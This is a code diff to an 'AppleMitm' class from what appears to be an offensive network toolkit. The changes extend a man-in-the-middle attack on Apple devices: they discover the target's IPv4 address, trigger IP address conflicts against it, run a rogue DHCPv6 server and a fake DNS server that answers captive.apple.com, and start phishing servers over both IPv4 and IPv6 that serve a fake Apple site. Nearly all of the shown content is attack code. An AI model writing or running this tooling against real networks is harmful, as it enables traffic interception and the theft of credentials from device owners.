@@ -370,7 +370,7 @@ class AppleMitm:
         
         # endregion
 
-        # region Set target IPv6 address
+        # region Set target IPv6 address and new IPv6 address
         if self._ipv6_mitm:
             self._target = \
                 self._utils.set_ipv6_target(network_interface=mitm_network_interface,
@@ -379,6 +379,18 @@ class AppleMitm:
                                             target_vendor='apple',
                                             target_ipv6_address_is_local=True,
                                             exclude_ipv6_addresses=[self._your['ipv6-gateway']])
+
+            # region Get target IPv4 address
+            try:
+                ipv4_target: Dict[str, str] = \
+                    self._utils.set_ipv4_target(network_interface=mitm_network_interface,
+                                                target_ipv4_address=None,
+                                                target_mac_address=self._target['mac-address'],
+                                                quiet=True)
+                self._target['ipv4-address'] = ipv4_target['ipv4-address']
+            except AssertionError:
+                pass
+            # endregion
 
             # region Set target new IPv6 address
             if self._mitm_techniques[self._mitm_technique] == 'Rogue SLAAC/DHCPv6 server':
@@ -430,6 +442,10 @@ class AppleMitm:
 
             if self._target['mac-address'] is not None:
                 self._base.print_info('Target MAC address: ', self._target['mac-address'])
+
+            if 'ipv4-address' in self._target.keys():
+                if self._target['ipv4-address'] is not None:
+                    self._base.print_info('Target IPv4 address: ', self._target['ipv4-address'])
 
             if self._target['ipv6-address'] is not None:
                 self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])
@@ -504,10 +520,12 @@ class AppleMitm:
         # region Start Phishing server
         if phishing_site is None:
             phishing_site = 'apple'
-        
-        phishing_server: PhishingServer = PhishingServer()
-        phishing_server.start(address='0.0.0.0', port=80, site=phishing_site,
-                              redirect='authentication.net', quiet=True)
+        thread_manager.add_task(self._start_ipv4_phishing, phishing_site)
+        thread_manager.add_task(self._start_ipv6_phishing, phishing_site)
+        # endregion
+
+        # region Wait all threads
+        thread_manager.wait_for_completion()
         # endregion
 
     # endregion
@@ -518,15 +536,12 @@ class AppleMitm:
         if not deauth:
             # Start Network Conflict Creator (ncc)
             ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=self._your['network-interface'])
-            if self._ipv4_mitm:
+            try:
                 ncc.start(target_mac_address=self._target['mac-address'],
                           target_ip_address=self._target['ipv4-address'],
                           exit_on_success=True)
-            else:
-                ncc.start(target_mac_address=self._target['mac-address'],
-                          target_ip_address=self._target['ipv4-address'],
-                          exit_on_success=False)
-
+            except KeyError:
+                pass
         else:
             # Start WiFi deauth packets sender
             self._deauth_stop_sniffer()
@@ -594,7 +609,7 @@ class AppleMitm:
 
     # region DHCPv6 server
     def _dhcpv6_server(self):
-        sleep(3)
+        sleep(5)
         dhcpv6_server: DHCPv6Server = DHCPv6Server(network_interface=self._your['network-interface'])
         dhcpv6_server.start(target_ipv6_address=self._target['new-ipv6-address'],
                             target_mac_address=self._target['mac-address'],
@@ -609,6 +624,22 @@ class AppleMitm:
         dns_server.start(fake_answers=True,
                          success_domains=['captive.apple.com', 'authentication.net'],
                          listen_ipv6=True)
+    # endregion
+
+    # region IPv4 Phishing server
+    @staticmethod
+    def _start_ipv4_phishing(phishing_site: str = 'apple'):
+        phishing_server: PhishingServer = PhishingServer()
+        phishing_server.start(address='0.0.0.0', port=80, site=phishing_site,
+                              redirect='authentication.net', quiet=False)
+    # endregion
+
+    # region IPv6 Phishing server
+    @staticmethod
+    def _start_ipv6_phishing(phishing_site: str = 'apple'):
+        phishing_server: PhishingServer = PhishingServer()
+        phishing_server.start(address='::', port=80, site=phishing_site,
+                              redirect='authentication.net', quiet=False)
     # endregion
 
     # region Requests sniffer PRN function
